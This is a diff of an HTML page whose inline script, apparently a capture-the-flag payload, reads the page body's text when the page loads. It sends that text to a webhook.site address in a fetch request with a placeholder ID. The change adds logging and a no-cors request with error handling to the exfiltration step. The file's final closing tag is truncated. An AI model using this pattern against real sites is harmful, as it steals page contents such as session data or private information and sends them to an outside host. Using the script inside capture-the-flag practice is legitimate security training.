@@ -7,17 +7,33 @@
 </head>
 <body>
     <script>
-        // Wait for the DOM to fully load
-        document.addEventListener('DOMContentLoaded', function () {
-            // Change the selector based on where the flag is displayed
-            var flagElement = document.querySelector('body'); // or any specific selector that contains the flag
+        // Function to extract the flag from the page
+        function extractFlag() {
+            // Replace the selector below with the actual one that contains the flag
+            const flagElement = document.querySelector('body'); // Change this if the flag is in a specific element
+            
             if (flagElement) {
-                var flag = flagElement.innerText || flagElement.textContent; // Capture the text
-                fetch("https://webhook.site/YOUR_UNIQUE_ID?flag=" + encodeURIComponent(flag)); // Send it to webhook.site
+                const flagText = flagElement.innerText || flagElement.textContent; // Get the text content
+                console.log('Extracted Flag:', flagText); // Log the flag to console
+
+                // Send the flag to your webhook
+                fetch("https://webhook.site/YOUR_UNIQUE_ID?flag=" + encodeURIComponent(flagText), {
+                    method: 'GET', // Change to 'POST' if you want to send a POST request
+                    mode: 'no-cors' // Use 'no-cors' to avoid CORS issues, but note that this will hide response
+                })
+                .then(response => {
+                    console.log('Flag sent to webhook:', response);
+                })
+                .catch(error => {
+                    console.error('Error sending flag to webhook:', error);
+                });
             } else {
                 console.error('Flag element not found.');
             }
-        });
+        }
+
+        // Wait for the DOM to load and then call the extractFlag function
+        document.addEventListener('DOMContentLoaded', extractFlag);
     </script>
 </body>
-</html>
+</htm
